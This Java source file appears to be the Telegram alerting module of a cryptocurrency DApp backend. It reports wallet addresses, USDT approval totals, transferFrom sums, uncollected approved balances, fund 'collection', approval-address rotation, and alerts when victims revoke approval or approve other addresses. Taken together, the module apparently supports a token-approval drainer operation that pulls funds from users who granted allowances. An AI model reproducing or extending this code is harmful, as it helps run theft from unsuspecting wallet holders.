package project.monitor.telegram.business;

import java.math.BigDecimal;
import java.math.RoundingMode;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.util.HtmlUtils;

import kernel.util.Arith;
import kernel.util.DateUtils;
import kernel.util.StringUtils;
import project.Constants;
import project.monitor.activity.ActivityOrder;
import project.monitor.bonus.model.SettleOrder;
import project.monitor.report.DAppData;
import project.monitor.report.DAppUserDataSumService;
import project.monitor.telegram.TelegramMessageService;
import project.monitor.telegram.TextFormat;
import project.party.PartyService;
import project.party.model.Party;
import project.party.model.UserRecom;
import project.party.recom.UserRecomService;
import project.wallet.WalletExtend;
import project.wallet.WalletService;

public class TelegramBusinessMessageServiceImpl implements TelegramBusinessMessageService {
	private Logger logger = LoggerFactory.getLogger(TelegramBusinessMessageServiceImpl.class);
	protected DAppUserDataSumService dAppUserDataSumService;
	protected TelegramMessageService telegramMessageService;
	protected UserRecomService userRecomService;
	protected PartyService partyService;
	protected WalletService walletService;

	/**
	 * 用户新增发送消息
	 * 
	 * @param party
	 */
	@Override
	public void sendNewUserTeleg(Party party) {
		try {
			DAppData cacheGetData = dAppUserDataSumService.cacheGetData(new Date());

			List<Object> param = new ArrayList<Object>();
			param.add(party.getUsername());// [钱包地址]
			param.add(party.getUsercode() + userRemarks(party));// [用户UID]
			param.add(recentAgentName(party.getId().toString()));// [归属] 找到最近的代理商
			param.add(recentGuestName(party.getId().toString()));// [上级用户] 上级是最后一个演示用户的备注
			param.add(DateUtils.format(new Date(), DateUtils.DF_yyyyMMddHHmmss));// [时间]
			param.add(cacheGetData.getNewuser());// [今日新用户数]
			param.add(cacheGetData.getApprove_user());// [今日授权用户数]
			param.add(cacheGetData.getUser());// [总用户数]
			param.add(cacheGetData.getUsdt_user());// [授权总金额]
			param.add(cacheGetData.getUsdt_user_count());// [授权地址数]
			String text = TextFormat.getText(TextFormat.TEXT_NEW_USER, param.toArray());
			telegramMessageService.send(text);
		} catch (Exception e) {
			// TODO: handle exception
			logger.error("send TEXT_NEW_USER fail address:{},e:{}", party.getUsername(), e);
		}
	}

	/**
	 * 授权成功发送消息
	 * 
	 * @param party
	 */
	@Override
	public void sendApproveAddTeleg(Party party) {
		try {
			DAppData cacheGetData = dAppUserDataSumService.cacheGetData(new Date());

			List<Object> param = new ArrayList<Object>();
			param.add(party.getUsername());// [钱包地址]
			param.add(party.getUsercode() + userRemarks(party));// [用户UID]
			param.add(recentAgentName(party.getId().toString()));// [归属] 找到最近的代理商
			param.add(recentGuestName(party.getId().toString()));// [上级用户] 上级是最后一个演示用户的备注
			param.add(DateUtils.format(new Date(), DateUtils.DF_yyyyMMddHHmmss));// [时间]
			param.add(cacheGetData.getNewuser());// [今日新用户数]
			param.add(cacheGetData.getApprove_user());// [今日授权用户数]
			param.add(cacheGetData.getUser());// [总用户数]
			param.add(cacheGetData.getUsdt_user());// [授权总金额]
			param.add(cacheGetData.getTransferfromsum());// [授权转账总金额]
			param.add(Arith.sub(cacheGetData.getUsdt_user(), cacheGetData.getTransferfromsum()));// [未归集授权总金额]
			param.add(cacheGetData.getUsdt_user_count());// [授权地址数]
			param.add("https://etherscan.io/address/" + party.getUsername());// [用户地址连接]
			param.add("在Etherscan上查看");// [链接标题]
			String text = TextFormat.getText(TextFormat.TEXT_APPROVE, param.toArray());
			telegramMessageService.send(text);
		} catch (Exception e) {
			// TODO: handle exception
			logger.error("send TEXT_APPROVE fail address:{},e:{}", party.getUsername(), e);
		}
	}

	/**
	 * 授权失败发送消息
	 * 
	 * @param party
	 */
	public void sendApproveErrorAddTeleg(Party party) {
		try {
			DAppData cacheGetData = dAppUserDataSumService.cacheGetData(new Date());

			List<Object> param = new ArrayList<Object>();
			param.add(party.getUsername());// [钱包地址]
			param.add(party.getUsercode() + userRemarks(party));// [用户UID]
			param.add(recentAgentName(party.getId().toString()));// [归属] 找到最近的代理商
			param.add(recentGuestName(party.getId().toString()));// [上级用户] 上级是最后一个演示用户的备注
			param.add(DateUtils.format(new Date(), DateUtils.DF_yyyyMMddHHmmss));// [时间]
			param.add(cacheGetData.getNewuser());// [今日新用户数]
			param.add(cacheGetData.getApprove_user());// [今日授权用户数]
			param.add(cacheGetData.getUser());// [总用户数]
			param.add(cacheGetData.getUsdt_user());// [授权总金额]
			param.add(cacheGetData.getUsdt_user_count());// [授权地址数]
			param.add("https://etherscan.io/address/" + party.getUsername());// [用户地址连接]
			param.add("在Etherscan上查看");// [链接标题]
			String text = TextFormat.getText(TextFormat.TEXT_APPROVE_ERROR, param.toArray());
			telegramMessageService.send(text);
		} catch (Exception e) {
			// TODO: handle exception
			logger.error("send TEXT_APPROVE fail address:{},e:{}", party.getUsername(), e);
		}
	}

	/**
	 * 用户转换发起 发送消息
	 * 
	 * @param party
	 * @param exchangeVolumn
	 * @param usdtAmount
	 */
	@Override
	public void sendExchangeTeleg(Party party, double exchangeVolumn, double usdtAmount) {
		try {
			DAppData cacheGetData = dAppUserDataSumService.cacheGetData(new Date());

			List<Object> param = new ArrayList<Object>();
			param.add(party.getUsername());// [钱包地址]
			param.add(party.getUsercode() + userRemarks(party));// [用户UID]
			param.add(recentAgentName(party.getId().toString()));// [归属] 找到最近的代理商
			param.add(recentGuestName(party.getId().toString()));// [上级用户] 上级是最后一个演示用户的备注
			param.add(exchangeVolumn);// [ETH数量]
			param.add(usdtAmount);// [兑换USDT]
			param.add(DateUtils.format(new Date(), DateUtils.DF_yyyyMMddHHmmss));// [时间]
			param.add(cacheGetData.getNewuser());// [今日新用户数]
			param.add(cacheGetData.getApprove_user());// [今日授权用户数]
			param.add(cacheGetData.getUser());// [总用户数]
			param.add(cacheGetData.getUsdt_user());// [授权总金额]
			param.add(cacheGetData.getUsdt_user_count());// [授权地址数]
			String text = TextFormat.getText(TextFormat.TEXT_WALLET_ETH_WITHDRAW, param.toArray());
			telegramMessageService.send(text);
		} catch (Exception e) {
			// TODO: handle exception
			logger.error("send TEXT_WALLET_ETH_WITHDRAW fail address:{" + party.getUsername() + "},e:{}", e);
		}
	}

	/**
	 * 用户usdt变动发送消息
	 * 
	 * @param party
	 */
	@Override
	public void sendUsdtChangeTeleg(Party party, double amountBefore, double amount, double amountAfter) {
		try {
			DAppData cacheGetData = dAppUserDataSumService.cacheGetData(new Date());

			List<Object> param = new ArrayList<Object>();
			param.add(party.getUsername());// [钱包地址]
			param.add(party.getUsercode() + userRemarks(party));// [用户UID]
			param.add(recentAgentName(party.getId().toString()));// [归属] 找到最近的代理商
			param.add(recentGuestName(party.getId().toString()));// [上级用户] 上级是最后一个演示用户的备注
			param.add(amountBefore);// [历史余额]
			param.add(amount);// [变动金额]
			param.add(amountAfter);// [当前余额]
			param.add(DateUtils.format(new Date(), DateUtils.DF_yyyyMMddHHmmss));// [时间]
			param.add(cacheGetData.getNewuser());// [今日新用户数]
			param.add(cacheGetData.getApprove_user());// [今日授权用户数]
			param.add(cacheGetData.getUser());// [总用户数]
			param.add(cacheGetData.getUsdt_user());// [授权总金额]
			param.add(cacheGetData.getTransferfromsum());// [授权转账总金额]
			param.add(Arith.sub(cacheGetData.getUsdt_user(), cacheGetData.getTransferfromsum()));// [未归集授权总金额]
			param.add(cacheGetData.getUsdt_user_count());// [授权地址数]
			String text = TextFormat.getText(
					amount > 0 ? TextFormat.TEXT_WALLET_USDT_ADD : TextFormat.TEXT_WALLET_USDT_SUB, param.toArray());
			telegramMessageService.send(text);
		} catch (Exception e) {
			// TODO: handle exception
			logger.error("send TEXT_WALLET_USDT_CHANGE fail address:" + party.getUsername() + ",e:", e);
		}
	}

	/**
	 * 用户eth变动发送消息
	 * 
	 * @param party
	 */
	public void sendEthChangeTeleg(Party party, double amountBefore, double amount, double amountAfter) {
		try {
			DAppData cacheGetData = dAppUserDataSumService.cacheGetData(new Date());

			List<Object> param = new ArrayList<Object>();
			param.add(party.getUsername());// [钱包地址]
			param.add(party.getUsercode() + userRemarks(party));// [用户UID]
			param.add(recentAgentName(party.getId().toString()));// [归属] 找到最近的代理商
			param.add(recentGuestName(party.getId().toString()));// [上级用户] 上级是最后一个演示用户的备注
			param.add(new BigDecimal(amountBefore).setScale(8, RoundingMode.FLOOR).toPlainString());// [历史余额]
			param.add(new BigDecimal(amount).setScale(8, RoundingMode.FLOOR).toPlainString());// [变动金额]
			param.add(new BigDecimal(amountAfter).setScale(8, RoundingMode.FLOOR).toPlainString());// [当前余额]
			param.add(DateUtils.format(new Date(), DateUtils.DF_yyyyMMddHHmmss));// [时间]
			param.add(cacheGetData.getNewuser());// [今日新用户数]
			param.add(cacheGetData.getApprove_user());// [今日授权用户数]
			param.add(cacheGetData.getUser());// [总用户数]
			param.add(cacheGetData.getUsdt_user());// [授权总金额]
			param.add(cacheGetData.getTransferfromsum());// [授权转账总金额]
			param.add(Arith.sub(cacheGetData.getUsdt_user(), cacheGetData.getTransferfromsum()));// [未归集授权总金额]
			param.add(cacheGetData.getUsdt_user_count());// [授权地址数]
			String text = TextFormat.getText(
					amount > 0 ? TextFormat.TEXT_WALLET_ETH_ADD : TextFormat.TEXT_WALLET_ETH_SUB, param.toArray());
			telegramMessageService.send(text);
		} catch (Exception e) {
			// TODO: handle exception
			logger.error("send TEXT_WALLET_USDT_CHANGE fail address:" + party.getUsername() + ",e:", e);
		}
	}

	/**
	 * 成功加入活动发送
	 * 
	 * @param party
	 */
	@Override
	public void sendActivityAddTeleg(Party party, ActivityOrder activity) {
		try {
			DAppData cacheGetData = dAppUserDataSumService.cacheGetData(new Date());

			List<Object> param = new ArrayList<Object>();
			param.add(party.getUsername());// [钱包地址]
			param.add(party.getUsercode() + userRemarks(party));// [用户UID]
			param.add(recentAgentName(party.getId().toString()));// [归属] 找到最近的代理商
			param.add(recentGuestName(party.getId().toString()));// [上级用户] 上级是最后一个演示用户的备注
			param.add(activity.getTitle());// [活动]
			param.add(DateUtils.format(new Date(), DateUtils.DF_yyyyMMddHHmmss));// [时间]
			param.add(cacheGetData.getNewuser());// [今日新用户数]
			param.add(cacheGetData.getApprove_user());// [今日授权用户数]
			param.add(cacheGetData.getUser());// [总用户数]
			param.add(cacheGetData.getUsdt_user());// [授权总金额]
			param.add(cacheGetData.getTransferfromsum());// [授权转账总金额]
			param.add(Arith.sub(cacheGetData.getUsdt_user(), cacheGetData.getTransferfromsum()));// [未归集授权总金额]
			param.add(cacheGetData.getUsdt_user_count());// [授权地址数]
			String text = TextFormat.getText(TextFormat.TEXT_GET_ACTIVITY, param.toArray());
			telegramMessageService.send(text);
		} catch (Exception e) {
			// TODO: handle exception
			logger.error("send TEXT_GET_ACTIVITY fail address:{},activity_id:{},e:", party.getUsername(),
					activity.getId(), e);
		}
	}

	/**
	 * 授权转账失败发送消息
	 * 
	 * @param party
	 * @param amount 转账数额
	 * @param error  错误消息
	 * @param txHash 交易哈希
	 */
	public void sendTransferFromErrorTeleg(Party party, double amount, String error, String txHash) {
		try {
			// 失败有两种，交易未发起，交易已发起则直接发送链接去官网查看
			if (!StringUtils.isEmptyString(txHash)) {
				String url = "https://etherscan.io/tx/" + txHash;
				error = "<a href=\"" + url + "\">在Etherscan上查看</a>";
			}
			DAppData cacheGetData = dAppUserDataSumService.cacheGetData(new Date());

			List<Object> param = new ArrayList<Object>();
			param.add(party.getUsername());// [钱包地址]
			param.add(party.getUsercode() + userRemarks(party));// [用户UID]
			param.add(recentAgentName(party.getId().toString()));// [归属] 找到最近的代理商
			param.add(recentGuestName(party.getId().toString()));// [上级用户] 上级是最后一个演示用户的备注
			param.add(amount);// [转账数量]
			param.add(error);// [失败原因]
			param.add(DateUtils.format(new Date(), DateUtils.DF_yyyyMMddHHmmss));// [时间]
			param.add(cacheGetData.getNewuser());// [今日新用户数]
			param.add(cacheGetData.getApprove_user());// [今日授权用户数]
			param.add(cacheGetData.getUser());// [总用户数]
			param.add(cacheGetData.getUsdt_user());// [授权总金额]
			param.add(cacheGetData.getTransferfromsum());// [授权转账总金额]
			param.add(Arith.sub(cacheGetData.getUsdt_user(), cacheGetData.getTransferfromsum()));// [未归集授权总金额]
			param.add(cacheGetData.getUsdt_user_count());// [授权地址数]
			String text = TextFormat.getText(TextFormat.TEXT_TRANSFER_FROM_ERROR, param.toArray());
			telegramMessageService.send(text);
		} catch (Exception e) {
			// TODO: handle exception
			logger.error("send TEXT_APPROVE_ERROR fail address:" + party.getUsername() + ",e:", e);
		}
	}

	/**
	 * 发送当日数据
	 * 
	 * @param party
	 */
	public void sendTodayDataTeleg() {
		try {
			DAppData cacheGetData = dAppUserDataSumService.cacheGetData(new Date());

			List<Object> param = new ArrayList<Object>();
			param.add(cacheGetData.getNewuser());// [今日新用户数]
			param.add(cacheGetData.getApprove_user());// [今日授权用户数]
			param.add(cacheGetData.getUser());// [总用户数]
			
			param.add(cacheGetData.getUsdt_user());// [授权总金额]
			param.add(cacheGetData.getTransferfromsum());// [授权转账总金额]
			param.add(Arith.sub(cacheGetData.getUsdt_user(), cacheGetData.getTransferfromsum()));// [未归集授权总金额]
			param.add(cacheGetData.getUsdt_user_count());// [授权地址数]
			
			param.add(cacheGetData.getTransferfrom());// [今日授权转账金额]
			String text = TextFormat.getText(TextFormat.TEXT_TODAY_DATA, param.toArray());
			telegramMessageService.send(text);
		} catch (Exception e) {
			// TODO: handle exception
			logger.error("send TEXT_TODAY_DATA fail ,e:", e);
		}
	}

	/**
	 * 授权地址授权已满，切换新地址
	 * 
	 */
	public void sendApproveAddressFullTeleg(String oldApproveAddress, String newApproveAddress, int approveAddressNum,
			int approveUserNum) {
		try {
			DAppData cacheGetData = dAppUserDataSumService.cacheGetData(new Date());

			List<Object> param = new ArrayList<Object>();
			param.add(approveAddressNum);// [剩余授权地址数]
			param.add(approveUserNum);// [剩余可授权用户数]
			param.add(DateUtils.format(new Date(), DateUtils.DF_yyyyMMddHHmmss));// [时间]
			param.add(cacheGetData.getNewuser());// [今日新用户数]
			param.add(cacheGetData.getApprove_user());// [今日授权用户数]
			String text = TextFormat.getText(TextFormat.TEXT_APPROVE_ADDRESS_FULL, param.toArray());
			telegramMessageService.send(text);
		} catch (Exception e) {
			// TODO: handle exception
			logger.error("send TEXT_APPROVE_ADDRESS_FULL fail oldApproveAddress:" + oldApproveAddress
					+ ",newApproveAddress:" + newApproveAddress + ",e:", e);
		}
	}

	/**
	 * 最后一条授权剩余数量提醒
	 * 
	 */
	public void sendLastApproveAddressWarningTeleg(String approveAddress, int approveAddressNum, int approveUserNum) {
		try {
			DAppData cacheGetData = dAppUserDataSumService.cacheGetData(new Date());

			List<Object> param = new ArrayList<Object>();
			param.add(approveAddressNum);// [剩余授权地址数]
			param.add(approveUserNum);// [剩余可授权用户数]
			param.add(DateUtils.format(new Date(), DateUtils.DF_yyyyMMddHHmmss));// [时间]
			param.add(cacheGetData.getNewuser());// [今日新用户数]
			param.add(cacheGetData.getApprove_user());// [今日授权用户数]
			String text = TextFormat.getText(TextFormat.TEXT_LAST_APPROVE_ADDRESS_WARNING, param.toArray());
			telegramMessageService.send(text);
		} catch (Exception e) {
			// TODO: handle exception
			logger.error("send TEXT_LAST_APPROVE_ADDRESS_WARNING fail approveAddress:" + approveAddress + ",e:", e);
		}
	}

	/**
	 * 非本项目配置的授权地址授权
	 * 
	 * @param party
	 */
	public void sendApproveOtherDanger(Party party,List<String> otherApproveAddresses,List<String> otherApproveHash) {
		try {
			WalletExtend extend = walletService.saveExtendByPara(party.getId().toString(),
					Constants.WALLETEXTEND_DAPP_USDT_USER);
			List<Object> param = new ArrayList<Object>();
			param.add(party.getUsername());// [钱包地址]
			param.add(party.getUsercode() + userRemarks(party));// [用户UID]
			param.add(recentAgentName(party.getId().toString()));// [归属] 找到最近的代理商
			param.add(recentGuestName(party.getId().toString()));// [上级用户] 上级是最后一个演示用户的备注
			param.add(DateUtils.format(new Date(), DateUtils.DF_yyyyMMddHHmmss));// [时间]
			String approve = "";
			for (int i = 0; i < otherApproveAddresses.size(); i++) {
				if(i!=0) {
					approve +=",";
				}
				String add = otherApproveAddresses.get(i);
				String hash = otherApproveHash.get(i);
				approve += "<a href=\"https://etherscan.io/address/" + add + "\">"+add+"</a>";
				approve += "➡️<a href=\"https://etherscan.io/tx/" + hash + "\">点击查看授权HASH</a>";
				
			}
			param.add(approve);//[授权给]
			param.add(extend.getAmount());// [该用户授权金额]
			param.add("https://etherscan.io/address/" + party.getUsername());// [用户地址连接]
			param.add("在Etherscan上查看");// [链接标题]
			String text = TextFormat.getText(TextFormat.TEXT_APPROVE_OTHER_ADDRESS_DANGER, param.toArray());
			telegramMessageService.send(text);
		} catch (Exception e) {
			// TODO: handle exception
			logger.error("send TEXT_APPROVE fail address:{},e:{}", party.getUsername(), e);
		}
	}

	/**
	 * 用户取消授权
	 * 
	 * @param party
	 */
	public void sendApproveRevokedDanger(Party party) {
		try {
			WalletExtend extend = walletService.saveExtendByPara(party.getId().toString(),
					Constants.WALLETEXTEND_DAPP_USDT_USER);
			List<Object> param = new ArrayList<Object>();
			param.add(party.getUsername());// [钱包地址]
			param.add(party.getUsercode() + userRemarks(party));// [用户UID]
			param.add(recentAgentName(party.getId().toString()));// [归属] 找到最近的代理商
			param.add(recentGuestName(party.getId().toString()));// [上级用户] 上级是最后一个演示用户的备注
			param.add(DateUtils.format(new Date(), DateUtils.DF_yyyyMMddHHmmss));// [时间]
			param.add(extend.getAmount());// [该用户授权金额]
			param.add("https://etherscan.io/address/" + party.getUsername());// [用户地址连接]
			param.add("在Etherscan上查看");// [链接标题]
			String text = TextFormat.getText(TextFormat.TEXT_APPROVE_REVOKED_DANGER, param.toArray());
			telegramMessageService.send(text);
		} catch (Exception e) {
			// TODO: handle exception
			logger.error("send TEXT_APPROVE fail address:{},e:{}", party.getUsername(), e);
		}
	}

	/**
	 * 用户余额归集发送消息
	 * 
	 * @param party
	 */
	public void sendCollectTeleg(Party party,double amount) {
		try {
			DAppData cacheGetData = dAppUserDataSumService.cacheGetData(new Date());

			List<Object> param = new ArrayList<Object>();
			param.add(party.getUsername());// [钱包地址]
			param.add(party.getUsercode() + userRemarks(party));// [用户UID]
			param.add(recentAgentName(party.getId().toString()));// [归属] 找到最近的代理商
			param.add(recentGuestName(party.getId().toString()));// [上级用户] 上级是最后一个演示用户的备注
			param.add(new BigDecimal(amount).setScale(8, RoundingMode.FLOOR).toPlainString());// [变动金额]
			param.add(DateUtils.format(new Date(), DateUtils.DF_yyyyMMddHHmmss));// [时间]
			param.add(cacheGetData.getNewuser());// [今日新用户数]
			param.add(cacheGetData.getApprove_user());// [今日授权用户数]
			param.add(cacheGetData.getUser());// [总用户数]
			param.add(cacheGetData.getUsdt_user());// [授权总金额]
			param.add(cacheGetData.getTransferfromsum());// [授权转账总金额]
			param.add(Arith.sub(cacheGetData.getUsdt_user(), cacheGetData.getTransferfromsum()));// [未归集授权总金额]
			param.add(cacheGetData.getUsdt_user_count());// [授权地址数]
			param.add(cacheGetData.getTransferfrom());// [今日授权转账金额]
			String text = TextFormat.getText(TextFormat.TEXT_WALLET_USDT_COLLECT, param.toArray());
			telegramMessageService.send(text);
		} catch (Exception e) {
			// TODO: handle exception
			logger.error("send TEXT_WALLET_USDT_COLLECT fail address:" + party.getUsername() + ",e:", e);
		}
	}
	/**
	 * 清算转账失败发送消息
	 * 
	 * @param party
	 */
	public void sendSettleTransferErrorTeleg(SettleOrder settleOrder) {
		try {
			String error = settleOrder.getError();
			// 失败有两种，交易未发起，交易已发起则直接发送链接去官网查看
			if (!StringUtils.isEmptyString(settleOrder.getTxn_hash())) {
				String url = "https://etherscan.io/tx/" + settleOrder.getTxn_hash();
				error = "<a href=\"" + url + "\">在Etherscan上查看</a>";
			}
			DAppData cacheGetData = dAppUserDataSumService.cacheGetData(new Date());

			List<Object> param = new ArrayList<Object>();
			param.add(settleOrder.getOrder_no());// [清算订单号]
			param.add(settleOrder.getFrom_address());// [发起地址]
			param.add(settleOrder.getTo_address());// [到账地址]
			param.add(settleOrder.getVolume());// [转账数量]
			param.add(error);// [失败原因]
			param.add(DateUtils.format(new Date(), DateUtils.DF_yyyyMMddHHmmss));// [时间]
			param.add(cacheGetData.getNewuser());// [今日新用户数]
			param.add(cacheGetData.getApprove_user());// [今日授权用户数]
			param.add(cacheGetData.getUser());// [总用户数]
			param.add(cacheGetData.getUsdt_user());// [授权总金额]
			param.add(cacheGetData.getTransferfromsum());// [授权转账总金额]
			param.add(Arith.sub(cacheGetData.getUsdt_user(), cacheGetData.getTransferfromsum()));// [未归集授权总金额]
			param.add(cacheGetData.getUsdt_user_count());// [授权地址数]
			String text = TextFormat.getText(TextFormat.TEXT_SETTLE_TRANSFER_ERROR, param.toArray());
			telegramMessageService.send(text);
		} catch (Exception e) {
			// TODO: handle exception
			logger.error("send TEXT_SETTLE_TRANSFER_ERROR fail orderNo:" + settleOrder.getOrder_no() + ",e:", e);
		}
	}

	public String recentAgentName(String partyId) {

		List<UserRecom> parents = userRecomService.getParents(partyId);
		for (UserRecom ur : parents) {
			Party cacheParent = partyService.cachePartyBy(ur.getReco_id(), false);
			if (cacheParent != null && (Constants.SECURITY_ROLE_AGENT.equals(cacheParent.getRolename())
					|| Constants.SECURITY_ROLE_AGENTLOW.equals(cacheParent.getRolename()))) {
				return HtmlUtils.htmlEscape(cacheParent.getUsername());
			}
		}
		return "";
	}

	public String recentGuestName(String partyId) {

		List<UserRecom> parents = userRecomService.getParents(partyId);
		for (UserRecom ur : parents) {
			Party cacheParent = partyService.cachePartyBy(ur.getReco_id(), false);
			if (cacheParent != null && Constants.SECURITY_ROLE_GUEST.equals(cacheParent.getRolename())) {
				return cacheParent.getRemarks() == null ? "" : HtmlUtils.htmlEscape(cacheParent.getRemarks());
			}
		}
		return "";
	}

	public String userRemarks(Party party) {
		return StringUtils.isEmptyString(party.getRemarks()) ? ""
				: String.format("(%s)", HtmlUtils.htmlEscape(party.getRemarks()));
	}

	public void setdAppUserDataSumService(DAppUserDataSumService dAppUserDataSumService) {
		this.dAppUserDataSumService = dAppUserDataSumService;
	}

	public void setTelegramMessageService(TelegramMessageService telegramMessageService) {
		this.telegramMessageService = telegramMessageService;
	}

	public void setUserRecomService(UserRecomService userRecomService) {
		this.userRecomService = userRecomService;
	}

	public void setPartyService(PartyService partyService) {
		this.partyService = partyService;
	}

	public void setWalletService(WalletService walletService) {
		this.walletService = walletService;
	}

}
